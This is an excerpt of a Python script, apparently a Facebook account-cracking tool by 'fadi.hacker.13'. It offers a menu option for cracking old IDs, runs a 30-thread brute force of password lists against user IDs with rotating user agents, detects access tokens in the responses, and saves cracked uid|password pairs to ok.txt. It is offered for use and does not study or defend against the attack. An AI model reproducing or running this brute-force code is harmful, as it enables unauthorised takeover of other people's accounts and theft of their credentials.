...
logo = ("""
╔════════════════════════════════════════╗
║\33[1;32m[↦] 𝙰𝚄𝚃𝙷𝙾𝚁     : fadi.hacker.13 
║\33[1;32m[↦] 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺   : @fadi.hacker.13 
║\33[1;32m[↦] 𝙶𝙸𝚃𝙷𝚄𝙱     : persival1320 
...
class Main:
	def __init__(self):
		...
		print("\n\033[1;32m㋱ hello abdo \033[1;32m")
		...
		if syed in ["", " "]:
			...
			os.system('xdg-open https://www.facebook.com/fadi.hacker.13/')
			print("")
			time.sleep(1.5)
			print("\033[1;33m   This Is fadihacker13")
			print("")
			input("\n\033[1;32m   ENTER confirmation code  ==> \033[1;36m")
			time.sleep(1)
			print("")
			print("\033[1;32m  Successful Bro Please W8...")
			print("\033[1;32m  The Tool Created By fadihacker13 ")
			time.sleep(2.0)
			os.system("clear")
		print(logo)
		print("\033[0;90m╔══════════════════════════════════════════════════════════╗")
		print('\x1b[1;32m [1]\x1b[1;35m CRACKING OLD ID 2006-2010 ')
		print(' \x1b[1;32m[00] \x1b[1;30m exit')
		print("\033[0;90m╚══════════════════════════════════════════════════════════╝")
		DEVIL =input('\n   \x1b[1;32m chose option ')
		if DEVIL in ["1", "01"]:
			self.fbtua()
		if DEVIL in ["0",  "00"]:
			self.old2()
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				os.system("clear")
				print(logo)
				print("     \033[37;41mWAIT FOR RESULT\033[0;m\033[1;32m")
				print("\n\033[0;94m [+] BRUTE HAS BEEN START")
				print("\033[0;94m-----------------------------------------------")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n \033[0;95m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks For Using fadihacker13...")
		except Exception as e:exit(str(e))
 
	def api(self, uid, pwx):
		ua = random.choice(ugen)	
		sys.stdout.write(
			"\r\r %s\033[92;1m[FADI.H.13] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[1;32m   [FADI.H.13] %s | %s\033[32m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
